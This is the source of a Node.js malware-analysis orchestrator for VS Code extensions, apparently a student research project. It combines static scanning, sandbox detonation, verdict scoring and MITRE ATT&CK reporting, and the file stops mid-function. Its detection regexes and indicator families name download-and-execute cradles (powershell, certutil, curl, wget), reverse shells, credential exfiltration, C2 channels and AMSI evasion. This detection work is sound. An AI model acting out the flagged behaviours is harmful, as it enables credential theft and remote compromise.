#!/usr/bin/env node
'use strict';
/**
 * VEXGuard.js — VS Code Extension Guard (unified analysis engine)  v3
 * ===================================================================
 * ONE entrypoint that integrates every layer of the pipeline behind a clean,
 * embeddable API + CLI:
 *
 *   Layer 0  Dataset ingestion ........ dataset.js      (DataDog + VsMex layouts,
 *                                        ground-truth labels, node_modules excluded)
 *   Layer 1  Static pre-filter ........ preprocess.js   (AST-first de-obfuscation,
 *                                        GlassWorm invisible-Unicode, IOC scan)
 *   Layer 2  Dynamic detonation ....... sandbox.js      (vm.createContext hooks +
 *                                        Time Machine fast-forward + toString cloaking)
 *   Layer 3  Data-intel taint ......... data-intel.js   (closed-loop read → send)
 *   Layer 4  Mock VS Code API ......... mock-vscode.js
 *   Layer 5  Time Machine ............. time-machine.js
 *   Layer 6  Decoy victim profile ..... decoy-profile.js
 *            Anti-analysis cloak ...... native-spoof.js
 *            ZIP reader ............... zip-util.js
 *
 * ...and folds in what used to be separate CLIs (combine / evaluate / explain):
 *   • combined verdict     (FINAL = max(static, dynamic))   → VerdictEngine
 *   • forensic MITRE report                                 → ForensicEngine
 *   • confusion-matrix metrics                              → evaluate()
 *
 * WHAT CHANGED IN v3
 * ------------------
 *   • Dataset ingestion is a real module. `--dataset` now understands the VsMex
 *     tree (extensions/<id>/<version>/*.vsix + metadata CSVs) and the DataDog
 *     tree, resolves per-sample ground truth, and never descends node_modules.
 *   • Batch is CONCURRENT and non-blocking. Static and dynamic stages were run
 *     with spawnSync, which pins the whole run to one core; they are now async
 *     spawns driven by a bounded worker pool (`--concurrency`).
 *   • Samples are unpacked to a scratch directory and deleted after analysis, so
 *     a 3 800-sample corpus does not leave 40 GB of extracted extensions behind.
 *   • Results stream to CSV + JSONL as they complete, and `--resume` skips
 *     samples already present — a 6-hour corpus run survives an interruption.
 *
 * CLI
 * ---
 *   node VEXGuard.js <target.vsix|dir> [--json] [--out DIR] [--platform win32]
 *   node VEXGuard.js <target> --static        # static only
 *   node VEXGuard.js <target> --dynamic       # dynamic only
 *   node VEXGuard.js --dataset DIR [--label 1] [--concurrency 8] [--limit N]
 *   node VEXGuard.js --evaluate results.csv   # metrics on an existing CSV
 *   node VEXGuard.js --selftest               # build synthetic malware, prove it fires
 *
 * Project: CSN 304 — "Towards Identifying Malicious VS Code Extensions"
 */

const fs   = require('fs');
const path = require('path');
const os   = require('os');
const { spawn } = require('child_process');
const { EventEmitter } = require('events');
const { extractVsix } = require('./zip-util');
const DATASET = require('./dataset');

const RANK = { BENIGN: 0, SUSPICIOUS: 1, MALICIOUS: 2 };
const NAME = ['BENIGN', 'SUSPICIOUS', 'MALICIOUS'];

// ─────────────────────────────────────────────────────────────────────────────
//  Small shared helpers
// ─────────────────────────────────────────────────────────────────────────────
const readJson = (p) => { try { return JSON.parse(fs.readFileSync(p, 'utf8')); } catch (_) { return null; } };
const uniq     = (a) => [...new Set(a)];
const clip     = (s, n) => { s = String(s == null ? '' : s).replace(/\s+/g, ' ').trim(); return s.length > n ? s.slice(0, n) + '…' : s; };
const safeName = (s) => String(s).replace(/[^a-zA-Z0-9._-]/g, '_').slice(0, 120);
const rmrf     = (p) => { try { fs.rmSync(p, { recursive: true, force: true }); } catch (_) {} };

/**
 * Run a node script as a child process with a hard timeout.
 * Async (unlike the previous spawnSync) so the batch pool can actually overlap
 * work instead of serialising on one core.
 */
function runNode(script, args, { timeout = 120000, env = process.env, cwd } = {}) {
  return new Promise((resolve) => {
    let done = false, timer = null;
    const child = spawn(process.execPath, [script, ...args], {
      env, cwd, stdio: ['ignore', 'pipe', 'pipe'], windowsHide: true,
    });
    let out = '', err = '';
    // Drain both pipes: an unread pipe fills its buffer and deadlocks the child.
    child.stdout.on('data', (d) => { if (out.length < 4e6) out += d; });
    child.stderr.on('data', (d) => { if (err.length < 1e6) err += d; });

    const finish = (result) => {
      if (done) return;
      done = true;
      if (timer) clearTimeout(timer);
      resolve(result);
    };
    timer = setTimeout(() => {
      try { child.kill('SIGKILL'); } catch (_) {}
      finish({ status: null, timedOut: true, stdout: out, stderr: err });
    }, timeout);
    child.on('error', (e) => finish({ status: -1, timedOut: false, stdout: out, stderr: String(e && e.message) }));
    child.on('close', (code) => finish({ status: code, timedOut: false, stdout: out, stderr: err }));
  });
}

/** Bounded-concurrency map. Keeps `limit` promises in flight, preserving order. */
async function pool(items, limit, worker) {
  const results = new Array(items.length);
  let next = 0;
  const runners = new Array(Math.max(1, Math.min(limit, items.length))).fill(0).map(async () => {
    for (;;) {
      const i = next++;
      if (i >= items.length) return;
      results[i] = await worker(items[i], i);
    }
  });
  await Promise.all(runners);
  return results;
}

/** Descend to wherever package.json actually lives (dir or unpacked .vsix). */
function findPackageDir(root, maxDepth = 3) {
  if (fs.existsSync(path.join(root, 'extension', 'package.json'))) return path.join(root, 'extension');
  const q = [{ dir: root, depth: 0 }];
  while (q.length) {
    const { dir, depth } = q.shift();
    if (fs.existsSync(path.join(dir, 'package.json'))) return dir;
    if (depth >= maxDepth) continue;
    let ents; try { ents = fs.readdirSync(dir, { withFileTypes: true }); } catch (_) { continue; }
    for (const e of ents) if (e.isDirectory() && e.name !== 'node_modules' && !e.name.startsWith('.'))
      q.push({ dir: path.join(dir, e.name), depth: depth + 1 });
  }
  return root;
}

// ─────────────────────────────────────────────────────────────────────────────
//  CSV writing
// ─────────────────────────────────────────────────────────────────────────────
const csvEsc = (v) => {
  const s = String(v == null ? '' : v);
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
};

class CsvSink {
  /**
   * @param {string}  file
   * @param {string[]} headers
   * @param {boolean} append  Continue an existing file (resume). When false the
   *   file is TRUNCATED. Appending unconditionally meant a second run without
   *   --resume silently doubled every row in the CSV while the in-memory
   *   metrics stayed correct — a discrepancy that only shows up when someone
   *   later recomputes the numbers from the CSV.
   */
  constructor(file, headers, append = false) {
    this.file = file; this.headers = headers;
    if (!file) return;
    fs.mkdirSync(path.dirname(file), { recursive: true });
    const keep = append && fs.existsSync(file) && fs.statSync(file).size > 0;
    if (!keep) fs.writeFileSync(file, headers.join(',') + '\n');
  }
  write(row) {
    if (!this.file) return;
    fs.appendFileSync(this.file, this.headers.map((h) => csvEsc(row[h])).join(',') + '\n');
  }
}

// ═════════════════════════════════════════════════════════════════════════════
//  PLUGGABLE ENGINE #1 — Verdict   [EXTENSION POINT for LLM]
//  Contract:  classify(evidence) -> { verdict, is_malicious, is_flagged,
//                                     score, decided_by, reasons[] }   (may be async)
//  Default = the deployed rule: FINAL = the stronger of static & dynamic.
// ═════════════════════════════════════════════════════════════════════════════
/**
 * Indicator FAMILIES. Static and dynamic describe the same underlying behaviour
 * in different words ("ephemeral/free cloud backend endpoint (C2 staging)" vs
 * "data sent to an ephemeral/free cloud backend"), so corroboration has to be
 * matched on meaning, not on string equality.
 */
const INDICATOR_FAMILIES = [
  ['tunnel_c2',       /tunnel|ngrok|trycloudflare/i],
  ['chat_webhook',    /webhook|discord|slack/i],
  ['telegram_c2',     /telegram/i],
  ['blockchain_c2',   /solana|blockchain c2/i],
  ['dead_drop_c2',    /calendar|sheets|apps script/i],
  ['ephemeral_cloud', /ephemeral|free cloud backend/i],
  ['throwaway_domain',/throwaway c2|auto-generated/i],
  ['raw_ip',          /raw public ip|raw ip/i],
  ['drop_host',       /anonymous (?:paste|file-drop)|file-drop host|paste/i],
  ['cradle',          /cradle/i],
  ['encoded_lolbin',  /encoded\/decoded payload/i],
  ['reverse_shell',   /reverse shell/i],
  ['dropper',         /dropper|downloads an executable|executable\/dll payload/i],
  ['exfiltration',    /exfiltrat/i],
  ['recon',           /reconnaissance/i],
  ['persistence',     /persistence|autostart/i],
  ['evasion',         /evasion|defender|amsi/i],
  ['packed_payload',  /decoded data|decrypts an embedded|runtime-decrypts/i],
  ['miner',           /mining pool|miner/i],
  ['darknet',         /darknet|onion/i],
  ['obfuscation',     /invisible-unicode|glassworm/i],
];

const familiesOf = (reasons) => {
  const out = new Set();
  for (const r of reasons || []) {
    for (const [fam, re] of INDICATOR_FAMILIES) if (re.test(r.reason || '')) out.add(fam);
  }
  return out;
};

class RuleVerdictEngine {
  classify(evidence) {
    const s = (evidence.static  && evidence.static.verdict)  || { verdict: 'BENIGN', score: 0, reasons: [] };
    const d = (evidence.dynamic && evidence.dynamic.verdict) || { verdict: 'BENIGN', score: 0, reasons: [] };
    const rs = RANK[s.verdict] || 0, rd = RANK[d.verdict] || 0;
    let rank = Math.max(rs, rd);

    // ── Cross-modality corroboration ───────────────────────────────────────
    // Static and dynamic are INDEPENDENT observations: one reads the code, the
    // other watches it run. When both land on the SAME indicator family — the
    // C2 host is written in the source AND the extension actually contacted it
    // — the evidence is materially stronger than either alone, and two
    // sub-threshold SUSPICIOUS findings become a confident MALICIOUS.
    //
    // Deliberately narrow: it requires an overlapping family, not merely two
    // SUSPICIOUS verdicts. A blanket "both suspicious ⇒ malicious" rule was
    // measured on the benign control set and cost a false positive (a language
    // server whose static and dynamic findings were unrelated to each other),
    // whereas family-matched corroboration cost none.
    const sFam = familiesOf(s.reasons), dFam = familiesOf(d.reasons);
    const corroborated = [...sFam].filter((f) => dFam.has(f));
    const escalated = rank === 1 && corroborated.length > 0;
    if (escalated) rank = 2;

    const reasons = [
      ...((s.reasons) || []).map((r) => ({ source: 'static',  points: r.points, reason: r.reason })),
      ...((d.reasons) || []).map((r) => ({ source: 'dynamic', points: r.points, reason: r.reason })),
    ];
    if (escalated) {
      reasons.unshift({ source: 'corroboration', points: 0,
        reason: `static and dynamic independently confirm the same indicator (${corroborated.join(', ')})` });
    }

    return {
      verdict:      NAME[rank],
      is_malicious: rank === 2 ? 1 : 0,
      is_flagged:   rank >= 1 ? 1 : 0,
      score:        Math.max(s.score || 0, d.score || 0),
      decided_by:   escalated ? 'corroboration' : rs > rd ? 'static' : rd > rs ? 'dynamic' : 'both',
      corroborated_indicators: corroborated,
      reasons,
    };
  }
}

// ═════════════════════════════════════════════════════════════════════════════
//  PLUGGABLE ENGINE #2 — Forensic  [EXTENSION POINT for LLM]
//  Contract:  report(evidence, verdict) -> { behaviours[], iocs[], markdown }
//  Default = the deployed MITRE ATT&CK behavioural narrative (ex-explain.js).
// ═════════════════════════════════════════════════════════════════════════════
class MitreForensicEngine {
  report(evidence, verdict) {
    const log  = evidence.dynamic || {};
    const stat = evidence.static  || {};
    const behaviours = this._behaviours(log, stat);
    // Cap evidence lists. A specimen that beacons in a loop yields thousands of
    // near-identical command/host strings; unbounded, one sample serialised to
    // a 17 MB record and a corpus run would have written well over a gigabyte
    // of JSONL. Six items is what the narrative renders anyway.
    for (const b of behaviours) {
      const n = (b.evidence || []).length;
      if (n > 8) { b.evidence = b.evidence.slice(0, 8); b.evidence_truncated_from = n; }
    }
    const iocs = this._iocs(log);
    for (const k of ['hosts', 'shell_commands', 'exfil_categories', 'taint_flows']) {
      if (Array.isArray(iocs[k]) && iocs[k].length > 50) {
        iocs[`${k}_truncated_from`] = iocs[k].length;
        iocs[k] = iocs[k].slice(0, 50);
      }
    }
    const markdown = this._markdown(evidence, verdict, behaviours, iocs);
    return { behaviours, iocs, markdown };
  }

  _behaviours(log, stat) {
    const events  = log.events || [];
    const beacons = log.outbound_messages || [];
    const ev = (mod, re) => events.filter((e) => e.module === mod && (!re || re.test(e.function_hooked)));
    const B = [];
    const add = (title, technique, detail, evidence) => B.push({ title, technique, detail, evidence: evidence || [] });

    const cp = ev('child_process');
    if (cp.length) {
      const cmds = uniq(cp.map((e) => [e.arguments.command, e.arguments.args, e.arguments.file, e.arguments.modulePath].filter(Boolean).join(' ')));
      const cradle = cmds.find((c) => /(powershell|cmd\.exe|certutil|bitsadmin|curl|wget|invoke-webrequest)/i.test(c) && /(https?:\/\/|\.bat|\.ps1|\.exe|catbox|pastebin)/i.test(c));
      if (cradle) add('Download-and-execute cradle', 'T1059 + T1105',
        'Launched a LOLBIN that downloads and runs a remote payload — a two-stage stager.', cmds);
      else add('OS process / shell execution', 'T1059',
        'Spawned external OS processes via child_process — abnormal for a UI extension.', cmds);
    }
    const sock = ev('net', /connect|createConnection|Socket/i);
    if (sock.length && cp.length) add('Reverse shell', 'T1059 + T1571',
      'A raw TCP socket was bound to a system shell — interactive remote command execution.',
      uniq(sock.map((e) => `${e.arguments.host || '?'}:${e.arguments.port || '?'}`)));
    else if (sock.length) add('Raw TCP connection', 'T1095',
      'Opened a raw TCP socket to an external host (covert C2 channel).',
      uniq(sock.map((e) => `${e.arguments.host || '?'}:${e.arguments.port || '?'}`)));

    const dl = beacons.filter((b) => /\.(exe|dll|bin|ps1|scr|msi)\b/i.test(b.destination || ''));
    if (dl.length) add('Payload download (dropper)', 'T1105',
      'Downloaded an executable/DLL from a remote server' + (cp.length ? ' and attempted to launch it' : '') + '.',
      uniq(dl.map((b) => b.destination)));

    // Proven exfiltration: source → sink, with the source file named.
    const stolen = log.stolen_data || {};
    if (stolen.data_stolen) {
      add('Credential exfiltration (proven data flow)', 'T1552 + T1567',
        `Read sensitive data and transmitted the same bytes off-box: ${(stolen.categories || []).join(', ')}.`,
        (stolen.flows || []).map((f) => `${f.category}: ${f.source} → ${f.sink}`));
    }

    const SKIP = new Set(['', 'localhost', '127.0.0.1', '0.0.0.0']);
    const sent = beacons.filter((b) => (b.body_bytes || (b.body || '').length) > 0 && !SKIP.has(b.host));
    if (sent.length && !stolen.data_stolen) {
      const recon = ev('os', /userInfo|homedir|hostname|networkInterfaces/).length > 0;
      add(recon ? 'Host reconnaissance + transmission' : 'Outbound C2 / data transmission',
          recon ? 'T1082 + T1567' : 'T1071',
          recon ? 'Harvested host info (username, home dir, platform…) and transmitted it off-box.'
                : 'Transmitted data to an external endpoint.',
          sent.map((b) => `${b.method} ${b.host || b.destination} :: ${clip(b.decoded || b.body, 160)}`));
    }
    if (ev('crypto', /createDecipheriv/).length) add('Runtime-decrypted payload', 'T1027 + T1140',
      'Decrypted an embedded payload in memory at runtime (AES) to evade static scanners.', []);
    if (events.some((e) => e.module === 'eval')) add('Dynamic code evaluation', 'T1059 + T1140',
      'Built and executed code at runtime via eval()/new Function() — multi-stage/obfuscated malware.', []);
    const inv = stat.invisible_unicode || 0;
    if (inv > 8) add('Invisible-Unicode obfuscation', 'T1027.010',
      `${inv} invisible Unicode codepoints (GlassWorm hiding technique).`, []);

    if (!B.length) {
      const reasons = (stat.verdict && stat.verdict.reasons) || [];
      if (reasons.length) add('Static indicators only (no runtime detonation)', 'T1195 / dormant first-stage',
        'No malicious behaviour executed; flagged by static indicators only — likely a dormant first stage.',
        reasons.map((r) => r.reason));
      else add('No observable malicious behaviour', 'n/a',
        'Neither dynamic nor static revealed a payload (clean re-publish or dormant first stage).', []);
    }
    return B;
  }

  _iocs(log) {
    const s = log.summary || {};
    const beacons = log.outbound_messages || [];
    return {
      hosts:            uniq(beacons.map((b) => b.host || b.destination).filter(Boolean)),
      shell_commands:   s.shell_commands_attempted || [],
      exfil_categories: s.stolen_categories || [],
      taint_flows:      (log.stolen_data && log.stolen_data.flows) || [],
      outbound_count:   beacons.length,
    };
  }

  _markdown(evidence, verdict, behaviours, iocs) {
    const t = (evidence.dynamic && evidence.dynamic.target) || (evidence.static && evidence.static.target) || {};
    const name = `${t.publisher || ''}.${t.name || ''}`.replace(/^\.|\.$/g, '') || evidence.sample || 'unknown';
    const icon = verdict.verdict === 'MALICIOUS' ? '🔴' : verdict.verdict === 'SUSPICIOUS' ? '🟡' : '🟢';
    const L = [];
    L.push(`# ${icon} ${name} — ${verdict.verdict}`, '');
    L.push(`**Version:** ${t.version || '?'}  ·  **Score:** ${verdict.score}  ·  **Decided by:** ${verdict.decided_by}`, '');
    if (evidence.dynamic && evidence.dynamic.intel && evidence.dynamic.intel.purpose)
      L.push(`**Purpose:** ${evidence.dynamic.intel.purpose}`, '');
    L.push('## Behaviours (MITRE ATT&CK)', '');
    for (const b of behaviours) {
      L.push(`### ${b.title}  \`${b.technique}\``);
      L.push(b.detail);
      for (const e of (b.evidence || []).slice(0, 6)) L.push(`- \`${clip(e, 180)}\``);
      L.push('');
    }
    if (iocs.taint_flows.length) {
      L.push('## Proven data flows (taint source → sink)', '');
      for (const f of iocs.taint_flows) L.push(`- **${f.category}** (${f.strength}): \`${f.source}\` → \`${f.sink}\``);
      L.push('');
    }
    if (iocs.hosts.length)          L.push('## Network IOCs', '', ...iocs.hosts.map((h) => `- ${h}`), '');
    if (iocs.shell_commands.length) L.push('## Commands', '', ...iocs.shell_commands.map((c) => `- \`${clip(c, 180)}\``), '');
    if (verdict.reasons.length) {
      L.push('## Why this verdict', '');
      for (const r of verdict.reasons) L.push(`- (+${r.points}, ${r.source}) ${r.reason}`);
      L.push('');
    }
    return L.join('\n');
  }
}

// ═════════════════════════════════════════════════════════════════════════════
//  VEXGuard — the orchestrator
// ═════════════════════════════════════════════════════════════════════════════
class VEXGuard extends EventEmitter {
  /**
   * @param {Object} [opts]
   * @param {string} [opts.engineDir]     Folder holding preprocess.js/sandbox.js. Default: this file's dir.
   * @param {string} [opts.output]        Where to write reports. Default ./vexguard-results.
   * @param {string} [opts.scratch]       Where to unpack samples. Default: OS temp.
   * @param {string} [opts.platform]      OS to spoof in the sandbox (win32|darwin|linux). Default win32.
   * @param {number} [opts.maxVirtualMs]  Time-Machine horizon override (default 366d in the engine).
   * @param {number} [opts.timeout]       Per-sample dynamic timeout (ms). Default 120000.
   * @param {number} [opts.staticTimeout] Per-sample static timeout (ms). Default 90000.
   * @param {boolean}[opts.fast]          Batch mode: collapse harness settle waits.
   * @param {boolean}[opts.keepUnpacked]  Keep extracted samples (default false — they are huge).
   * @param {Object} [opts.verdictEngine]  { classify(evidence) } — swap for an LLM.
   * @param {Object} [opts.forensicEngine] { report(evidence, verdict) } — swap for an LLM.
   */
  constructor(opts = {}) {
    super();
    this.engineDir     = opts.engineDir || __dirname;
    this.output        = opts.output    || path.resolve('./vexguard-results');
    this.scratch       = opts.scratch   || path.join(os.tmpdir(), 'vexguard-scratch');
    this.platform      = opts.platform  || 'win32';
    this.maxVirtualMs  = opts.maxVirtualMs;
    this.timeout       = opts.timeout       || 120000;
    this.staticTimeout = opts.staticTimeout || 90000;
    this.fast          = !!opts.fast;
    this.keepUnpacked  = !!opts.keepUnpacked;
    this.verdictEngine  = opts.verdictEngine  || new RuleVerdictEngine();
    this.forensicEngine = opts.forensicEngine || new MitreForensicEngine();
    this._pre = path.join(this.engineDir, 'preprocess.js');
    this._box = path.join(this.engineDir, 'sandbox.js');
  }

  // ── Prepare an extension directory from a .vsix or a folder ────────────────
  _prepare(target, workDir) {
    const abs = path.resolve(target);
    if (!fs.existsSync(abs)) throw new Error(`target not found: ${abs}`);
    if (fs.statSync(abs).isFile()) {
      if (!/\.(vsix|zip)$/i.test(abs)) throw new Error('target must be a .vsix/.zip file or a directory');
      return { extDir: extractVsix(abs, workDir), unpacked: workDir };
    }
    return { extDir: findPackageDir(abs), unpacked: null };
  }

  _env() {
    const env = Object.assign({}, process.env, { SANDBOX_OS: this.platform });
    if (this.maxVirtualMs) env.SANDBOX_MAX_VIRTUAL_MS = String(this.maxVirtualMs);
    if (this.fast) env.SANDBOX_FAST = '1';
    return env;
  }

  // ── Layer 1: static ────────────────────────────────────────────────────────
  async scanStatic(extDir) {
    const r = await runNode(this._pre, [extDir], { timeout: this.staticTimeout, env: this._env() });
    const report = readJson(path.join(extDir, 'static-analysis.json'));
    if (!report && r.timedOut) return { verdict: { verdict: 'BENIGN', score: 0, reasons: [] }, timed_out: true };
    return report;
  }

  // ── Layer 2: dynamic detonation (subprocess = process isolation) ───────────
  async detonate(extDir) {
    const r = await runNode(this._box, [extDir], { timeout: this.timeout, env: this._env() });
    return { report: readJson(path.join(extDir, 'execution-log.json')), timedOut: !!r.timedOut, stderr: r.stderr };
  }

  /**
   * Full analysis of ONE sample: static + dynamic + combined verdict + forensic.
   * Emits lifecycle events for a UI. Returns a JSON-serializable result.
   */
  async analyze(target, opts = {}) {
    const tag  = opts.tag || safeName(path.basename(String(target)));
    const work = opts.workDir || path.join(this.scratch, `${tag}-${process.pid}-${Date.now()}`);
    fs.mkdirSync(work, { recursive: true });
    this.emit('sample:start', { target: String(target) });

    let extDir, unpacked = null;
    try { ({ extDir, unpacked } = this._prepare(target, work)); }
    catch (e) { this.emit('error', e); rmrf(work); throw e; }

    try {
      const stat = opts.dynamicOnly ? null : await this.scanStatic(extDir);
      this.emit('static:done', stat);

      const dyn = opts.staticOnly ? { report: null, timedOut: false } : await this.detonate(extDir);
      this.emit('dynamic:done', dyn.report);

      const t = (dyn.report && dyn.report.target) || (stat && stat.target) || {};
      const sample = `${t.publisher || ''}.${t.name || ''}`.replace(/^\.|\.$/g, '') || tag;

      const evidence = { sample, version: t.version || '', static: stat, dynamic: dyn.report, timed_out: dyn.timedOut };

      const verdict  = await this.verdictEngine.classify(evidence);          // pluggable (LLM-ready)
      this.emit('verdict', verdict);
      const forensic = await this.forensicEngine.report(evidence, verdict);  // pluggable (LLM-ready)
      this.emit('forensic', forensic);

      const result = {
        sample, version: evidence.version, target: String(target), final: verdict, forensic,
        static: stat && stat.verdict, dynamic: dyn.report && dyn.report.verdict,
        static_iocs: (stat && stat.iocs) || [],
        summary: (dyn.report && dyn.report.summary) || {},
        intel:   (dyn.report && dyn.report.intel) || {},
        stolen:  (dyn.report && dyn.report.stolen_data) || {},
        time_machine: (dyn.report && dyn.report.time_machine) || {},
        timed_out: dyn.timedOut,
      };

      if (opts.persist !== false) {
        const outDir = path.join(this.output, 'samples', safeName(sample || tag));
        try {
          fs.mkdirSync(outDir, { recursive: true });
          fs.writeFileSync(path.join(outDir, 'vexguard-result.json'), JSON.stringify(result, null, 2));
          fs.writeFileSync(path.join(outDir, 'analysis.md'), forensic.markdown);
        } catch (_) {}
      }

      this.emit('sample:done', result);
      return result;
    } finally {
      // Unpacked samples are large and numerous; keep them only on request.
      if (unpacked && !this.keepUnpacked) rmrf(unpacked);
    }
  }

  // ───────────────────────────────────────────────────────────────────────────
  //  BATCH
  // ───────────────────────────────────────────────────────────────────────────

  static get ROW_HEADERS() {
    return ['dataset', 'sample', 'id', 'version', 'label', 'tier', 'classification',
            'final_verdict', 'final_is_malicious', 'final_is_flagged', 'decided_by', 'score',
            'static_verdict', 'static_score', 'dynamic_verdict', 'dynamic_score',
            'total_events', 'http_requests', 'child_process_calls', 'outbound_messages',
            'eval_calls', 'fs_reads', 'net_socket_calls',
            'data_stolen', 'stolen_categories', 'hosts', 'purpose',
            'timers_fired', 'virtual_days', 'timed_out', 'error', 'top_reasons', 'target', 'duration_ms'];
  }

  _row(result, meta) {
    const f = result.final || {};
    const s = result.summary || {};
    const st = result.stolen || {};
    const tm = result.time_machine || {};
    return {
      dataset: meta.dataset, sample: result.sample || meta.id, id: meta.id, version: meta.version || result.version,
      label: meta.label != null ? meta.label : '', tier: meta.tier || '', classification: meta.classification || '',
      final_verdict: f.verdict, final_is_malicious: f.is_malicious, final_is_flagged: f.is_flagged,
      decided_by: f.decided_by, score: f.score,
      static_verdict:  (result.static  && result.static.verdict)  || 'BENIGN',
      static_score:    (result.static  && result.static.score)    || 0,
      dynamic_verdict: (result.dynamic && result.dynamic.verdict) || 'BENIGN',
      dynamic_score:   (result.dynamic && result.dynamic.score)   || 0,
      total_events: s.total_events || 0, http_requests: s.http_requests || 0,
      child_process_calls: s.child_process_calls || 0, outbound_messages: s.outbound_message_count || 0,
      eval_calls: s.eval_calls || 0, fs_reads: s.fs_reads || 0, net_socket_calls: s.net_socket_calls || 0,
      data_stolen: st.data_stolen ? 1 : 0,
      stolen_categories: (st.categories || []).join('|'),
      hosts: ((result.forensic && result.forensic.iocs && result.forensic.iocs.hosts) || []).slice(0, 5).join('|'),
      purpose: (result.intel && result.intel.purpose) || '',
      timers_fired: tm.timers_fired || 0,
      virtual_days: tm.virtual_elapsed_ms ? +(tm.virtual_elapsed_ms / 86400000).toFixed(2) : 0,
      timed_out: result.timed_out ? 1 : 0, error: '',
      top_reasons: (f.reasons || []).slice(0, 4).map((r) => `${r.source}:+${r.points} ${r.reason}`).join(' ; ').slice(0, 400),
      target: meta.target || result.target || '',
      duration_ms: result.duration_ms != null ? result.duration_ms : '',
    };
  }

  _errorRow(meta, message) {
    const row = {};
    for (const h of VEXGuard.ROW_HEADERS) row[h] = '';
    Object.assign(row, {
      dataset: meta.dataset, sample: meta.id, id: meta.id, version: meta.version,
      label: meta.label != null ? meta.label : '', tier: meta.tier || '', classification: meta.classification || '',
      final_verdict: 'ERROR', final_is_malicious: 0, final_is_flagged: 0, score: 0,
      error: String(message).slice(0, 300), target: meta.target || '',
    });
    return row;
  }

  /**
   * Analyse an entire dataset tree with bounded concurrency, streaming results.
   *
   * @param {string} inputDir
   * @param {Object} [opts]
   * @param {number} [opts.label]        force ground truth (0/1); otherwise inferred
   * @param {number} [opts.concurrency]  parallel samples (default: cpus-1, min 2)
   * @param {number} [opts.limit]        cap the sample count
   * @param {boolean}[opts.latestOnly]   newest version per extension only
   * @param {boolean}[opts.staticOnly]   skip detonation
   * @param {string} [opts.csv]          stream rows here
   * @param {string} [opts.jsonl]        stream full results here
   * @param {boolean}[opts.resume]       skip ids already present in the CSV
   * @returns {{rows:Array, metrics:Object, stats:Object}}
   */
  async analyzeDataset(inputDir, opts = {}) {
    const ds = DATASET.discover(inputDir, {
      label: opts.label, limit: opts.limit, latestOnly: opts.latestOnly, datasetName: opts.datasetName,
      includeTiers: opts.includeTiers, excludeTiers: opts.excludeTiers,
    });
    const concurrency = opts.concurrency || Math.max(2, (os.cpus().length || 4) - 1);

    // Resume: skip anything already recorded. Parsed with the real CSV reader,
    // not split(','), so a quoted field containing a comma cannot shift the
    // columns and make the resume key nonsense.
    const done = new Set();
    if (opts.resume && opts.csv && fs.existsSync(opts.csv)) {
      for (const r of DATASET.parseCsv(fs.readFileSync(opts.csv, 'utf8'))) {
        if (r.id) done.add(`${String(r.id).toLowerCase()}@${r.version || ''}`);
      }
    }
    const todo = ds.samples.filter((s) => !done.has(s.key));

    const csv   = opts.csv ? new CsvSink(opts.csv, VEXGuard.ROW_HEADERS, !!opts.resume) : null;
    const jsonl = opts.jsonl || null;
    if (jsonl) {
      fs.mkdirSync(path.dirname(jsonl), { recursive: true });
      if (!opts.resume) { try { fs.writeFileSync(jsonl, ''); } catch (_) {} }
    }

    this.emit('dataset:start', { dataset: ds.datasetName, total: todo.length, skipped: done.size, concurrency, stats: ds.stats });

    const rows = [];
    let completed = 0;
    await pool(todo, concurrency, async (s) => {
      let row;
      try {
        const _analyzeStart = Date.now();
        const r = await this.analyze(s.target, { tag: safeName(s.id + '-' + s.version), staticOnly: opts.staticOnly, persist: opts.persist });
        r.duration_ms = Date.now() - _analyzeStart;
        row = this._row(r, s);
        if (jsonl) { try { fs.appendFileSync(jsonl, JSON.stringify(VEXGuard.evidenceRecord(s, r)) + '\n'); } catch (_) {} }
      } catch (e) {
        row = this._errorRow(s, e && e.message);
      }
      rows.push(row);
      if (csv) csv.write(row);
      completed++;
      this.emit('dataset:progress', { i: completed, total: todo.length, dataset: ds.datasetName, row });
      return row;
    });

    const metrics = this.evaluate(rows);
    this.emit('dataset:done', { dataset: ds.datasetName, rows: rows.length, metrics });
    return { rows, metrics, stats: ds.stats, dataset: ds.datasetName, kind: ds.kind };
  }

  // ── Metrics (ex-evaluate.js) ───────────────────────────────────────────────
  /**
   * Confusion matrix. `predKey` selects the decision rule:
   *   final_is_malicious → STRICT   (only a MALICIOUS verdict counts as positive)
   *   final_is_flagged   → TRIAGE   (MALICIOUS or SUSPICIOUS counts as positive)
   */
  evaluate(rows, predKey = 'final_is_malicious') {
    let TP = 0, FP = 0, FN = 0, TN = 0, skipped = 0;
    for (const r of rows) {
      const y = Number(r.label);
      if (y !== 0 && y !== 1) { skipped++; continue; }
      const p = Number(r[predKey]) ? 1 : 0;
      if (y === 1 && p === 1) TP++; else if (y === 0 && p === 1) FP++;
      else if (y === 1 && p === 0) FN++; else TN++;
    }
    const prec = TP + FP ? TP / (TP + FP) : 0;
    const rec  = TP + FN ? TP / (TP + FN) : 0;
    const f1   = prec + rec ? 2 * prec * rec / (prec + rec) : 0;
    const total = TP + TN + FP + FN;
    const acc  = total ? (TP + TN) / total : 0;
    return { TP, FP, FN, TN, total, skipped, precision: prec, recall: rec, f1, accuracy: acc };
  }

  /**
   * The per-sample record streamed to results-<corpus>.jsonl.
   *
   * Deliberately a DIGEST, not the whole result object: the full result carries
   * the rendered markdown report and every behaviour-evidence string, which for
   * a loop-beaconing specimen runs to megabytes. This keeps a corpus-scale
   * JSONL in the tens of MB while retaining everything needed to re-triage a
   * sample or to feed an LLM verdict engine. The complete report for any single
   * sample is still reproducible with `node VEXGuard.js <target> --json`.
   */
  static evidenceRecord(meta, result) {
    const f = result.final || {};
    return {
      meta: { id: meta.id, version: meta.version, dataset: meta.dataset, label: meta.label,
              tier: meta.tier, classification: meta.classification, target: meta.target },
      verdict: {
        final: f.verdict, is_malicious: f.is_malicious, score: f.score, decided_by: f.decided_by,
        corroborated: f.corroborated_indicators || [],
        reasons: (f.reasons || []).slice(0, 20),
      },
      static:  result.static  || null,
      dynamic: result.dynamic || null,
      static_iocs: (result.static_iocs || []).slice(0, 30).map((i) => ({ points: i.points, reason: i.reason, file: i.file })),
      summary: result.summary || {},
      intel: result.intel ? {
        purpose: result.intel.purpose, families: result.intel.families,
        actions: (result.intel.actions || []).slice(0, 20),
        data_targeted: result.intel.data_targeted,
        c2_indicators: result.intel.c2_indicators,
        network: (result.intel.network || []).slice(0, 30),
      } : {},
      stolen: result.stolen ? {
        data_stolen: result.stolen.data_stolen,
        categories: result.stolen.categories,
        suspected_categories: result.stolen.suspected_categories,
